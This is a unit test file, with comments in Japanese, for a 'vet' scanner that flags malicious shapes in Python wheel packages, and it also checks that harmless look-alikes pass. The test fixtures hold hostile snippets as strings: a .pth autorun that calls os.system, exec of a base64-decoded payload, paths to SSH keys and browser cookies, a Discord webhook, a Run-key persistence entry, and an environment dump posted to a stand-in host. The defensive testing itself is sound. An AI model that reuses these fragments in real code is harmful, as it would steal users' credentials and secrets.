"""vet の検査。危険なコードは「文字列として zip に入れるだけ」で、実行はしない。
どの規則も、(1) 危険な見本で検出される (2) 似ているが無害な見本では検出されない、の両方を確かめる。"""
import pathlib, tempfile, unittest, zipfile
import vet


def make_wheel(files):
    d = pathlib.Path(tempfile.mkdtemp())
    p = d / "x-1.0-py3-none-any.whl"
    with zipfile.ZipFile(p, "w") as z:
        for name, data in files.items():
            z.writestr(name, data)
    return p


def rules(report, level=None):
    return {f["rule"] for f in report["findings"] if level in (None, f["level"])}


class MaliciousShapes(unittest.TestCase):
    def check(self, files, rule, verdict="reject"):
        rep = vet.vet(make_wheel(files))
        self.assertIn(rule, rules(rep), rep["findings"])
        self.assertEqual(rep["verdict"], verdict, rep["findings"])

    def test_pth_with_import_line(self):
        self.check({"x/__init__.py": "x=1\n", "evil.pth": "import os; os.system('calc')\n"}, "pth_code")

    def test_exec_of_decoded_payload(self):
        self.check({"x/a.py": "import base64\nexec(base64.b64decode(P))\n"}, "exec_obfuscated")

    def test_reads_ssh_dir(self):
        self.check({"x/a.py": "p = '~/.ssh/id_rsa'\n"}, "secret_paths")

    def test_reads_browser_cookie_db(self):
        self.check({"x/a.py": "p = r'AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'\n"}, "secret_paths")

    def test_discord_webhook(self):
        self.check({"x/a.py": "URL = 'https://discord.com/api/webhooks/1/abc'\n"}, "exfil_endpoints")

    def test_startup_persistence(self):
        self.check({"x/a.py": r"K = r'Software\Microsoft\Windows\CurrentVersion\Run'" + "\n"}, "persistence")

    def test_env_dump_with_network_in_same_function(self):
        src = "import os, urllib.request\ndef f():\n    d = dict(os.environ)\n    urllib.request.urlopen('https://e.example', data=str(d).encode())\n"
        self.check({"x/a.py": src}, "env_dump")

    def test_shell_true_with_built_command(self):
        self.check({"x/a.py": "import subprocess\ndef f(u):\n    subprocess.run('curl ' + u, shell=True)\n"}, "shell_exec")

    def test_bundled_executable(self):
        self.check({"x/a.py": "x=1\n", "x/helper.exe": b"MZ"}, "script_binary")


class ReviewShapes(unittest.TestCase):
    """機械では白黒つけられない形は reject にせず needs_review にする（AI が該当箇所を読む）。"""

    def check(self, files, rule):
        rep = vet.vet(make_wheel(files))
        self.assertIn(rule, rules(rep, vet.WARN), rep["findings"])
        self.assertEqual(rep["verdict"], "needs_review", rep["findings"])

    def test_subprocess_constant_args(self):
        self.check({"x/a.py": "import subprocess\nsubprocess.run(['ffmpeg', '-version'])\n"}, "subprocess")

    def test_dynamic_eval_without_decoder(self):
        self.check({"x/a.py": "def f(s):\n    return eval(s)\n"}, "dynamic_exec")

    def test_env_dump_without_network(self):
        self.check({"x/a.py": "import os\ndef f():\n    return dict(os.environ)\n"}, "env_dump")

    def test_netrc_reader(self):
        self.check({"x/a.py": "NETRC = '~/.netrc'\n"}, "cred_file")

    def test_native_binary(self):
        self.check({"x/a.py": "x=1\n", "x/_c.pyd": b"MZ"}, "native_binary")

    def test_ip_literal_url(self):
        self.check({"x/a.py": "U = 'http://192.0.2.7/api'\n"}, "ip_url")

    def test_ctypes(self):
        self.check({"x/a.py": "import ctypes\n"}, "risky_module")

    def test_unparseable_python(self):
        self.check({"x/a.py": "print 'py2 only'\n"}, "unparseable")

    def test_test_directory_downgrades_string_hits(self):
        # テスト置き場の中の兆候は reject でなく要確認（使うときに読み込まれにくい）。ただし見逃さず残す
        rep = vet.vet(make_wheel({"x/a.py": "x=1\n", "x/tests/test_a.py": "U = 'https://discord.com/api/webhooks/1/a'\n"}))
        self.assertEqual(rep["verdict"], "needs_review", rep["findings"])
        self.assertIn("exfil_endpoints", rules(rep, vet.WARN))


class LooksSimilarButHarmless(unittest.TestCase):
    """過剰に止めない。止めすぎると、探しても候補が全滅して自動更新が空回りする。"""

    def clean(self, files):
        rep = vet.vet(make_wheel(files))
        self.assertEqual(rep["verdict"], "clean", rep["findings"])

    def test_plain_module(self):
        self.clean({"x/a.py": "def add(a, b):\n    return a + b\n"})

    def test_docstring_mentions_dangerous_words(self):
        self.clean({"x/a.py": '"""Do not read ~/.ssh or post to discord.com/api/webhooks."""\ndef f():\n    """crontab -l, CurrentVersion\\Run"""\n    return 1\n'})

    def test_word_cookies_is_not_the_browser_file(self):
        self.clean({"x/a.py": "def f(jar):\n    return jar['cookies']\n"})

    def test_harmless_pth_with_only_paths(self):
        self.clean({"x/a.py": "x=1\n", "paths.pth": "# comment\n./libs\n"})

    def test_exec_of_a_constant(self):
        self.clean({"x/a.py": "exec('x = 1')\n"})

    def test_env_get_single_key(self):
        self.clean({"x/a.py": "import os\nK = os.environ.get('HOME')\nV = os.environ['PATH']\n"})

    def test_pth_with_import_in_a_name_not_a_command(self):
        self.clean({"x/a.py": "x=1\n", "p.pth": "importlib_dir\n"})


class Plumbing(unittest.TestCase):
    def test_sdist_and_unknown_file_types_refused(self):
        with self.assertRaises(ValueError):
            vet.vet("pkg-1.0.tar.gz")

    def test_wheel_is_not_extracted_to_disk(self):
        p = make_wheel({"x/a.py": "x=1\n"})
        before = set(p.parent.iterdir())
        vet.vet(p)
        self.assertEqual(set(p.parent.iterdir()), before)

    def test_binary_only_wheel_needs_review(self):
        rep = vet.vet(make_wheel({"x/_c.so": b"\x7fELF"}))
        self.assertIn("no_python", rules(rep))
        self.assertEqual(rep["verdict"], "needs_review")

    def test_limits_are_always_reported(self):
        self.assertTrue(vet.vet(make_wheel({"x/a.py": "x=1\n"}))["limits"])

    def test_folder_input_matches_wheel_input(self):
        d = pathlib.Path(tempfile.mkdtemp())
        (d / "x").mkdir()
        (d / "x" / "a.py").write_text("p = '~/.ssh/id_rsa'\n", encoding="utf-8")
        self.assertEqual(vet.vet(d)["verdict"], "reject")


if __name__ == "__main__":
    unittest.main()
